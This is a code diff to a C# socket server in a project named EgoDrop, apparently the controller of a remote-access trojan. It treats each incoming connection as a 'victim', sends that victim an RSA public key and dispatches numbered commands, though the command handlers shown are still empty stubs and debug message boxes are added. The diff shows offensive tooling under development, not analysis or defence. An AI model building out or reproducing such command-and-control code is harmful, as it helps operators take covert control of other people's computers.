@@ -72,6 +72,8 @@ namespace EgoDrop
                 Socket sktClnt = sktSrv.EndAccept(ar);
                 clsVictim victim = new clsVictim(sktClnt, this);
 
+                fnOnNewVictim(victim);
+
                 sktClnt.BeginReceive(
                     victim.m_abBuffer,
                     0,
@@ -79,8 +81,6 @@ namespace EgoDrop
                     SocketFlags.None,
                     new AsyncCallback(fnBeginRecvCallback), victim
                 );
-
-                MessageBox.Show(sktClnt.RemoteEndPoint.ToString());
             }
             catch (Exception ex)
             {
@@ -103,6 +103,10 @@ namespace EgoDrop
                 byte[] abStaticRecvBuffer = new byte[clsEDP.HEADER_SIZE];
                 byte[] abDynamicRecvBuffer = new byte[clsEDP.HEADER_SIZE];
 
+                string szB64Key = clsEZData.fnStrE2B64(victim.m_crypto.m_RSAKeyPair.szPublicKey);
+                MessageBox.Show(szB64Key);
+                victim.fnSend(1, 0, szB64Key);
+
                 do
                 {
                     abStaticRecvBuffer = new byte[clsEDP.HEADER_SIZE];
@@ -122,15 +126,21 @@ namespace EgoDrop
                             abDynamicRecvBuffer = edp.m_abMoreData;
                             headerInfo = clsEDP.fnGetHeader(abDynamicRecvBuffer);
 
-                            if (edp.m_nCommand == 0)
+                            uint nCmd = (uint)edp.m_nCommand;
+                            uint nParam = (uint)edp.m_nParam;
+
+                            if (nCmd == 0)
+                            {
+                                if (nParam == 0)
+                                {
+                                    
+                                }
+                            }
+                            else if (nCmd == 1)
                             {
 
                             }
-                            else if (edp.m_nCommand == 1)
-                            {
-
-                            }
-                            else if (edp.m_nCommand == 2)
+                            else if (nCmd == 2)
                             {
 
                             }
@@ -142,7 +152,7 @@ namespace EgoDrop
             catch (Exception ex)
             {
                 Socket sktClnt = victim.m_sktClnt;
-
+                MessageBox.Show(ex.Message);
             }
         }
     }
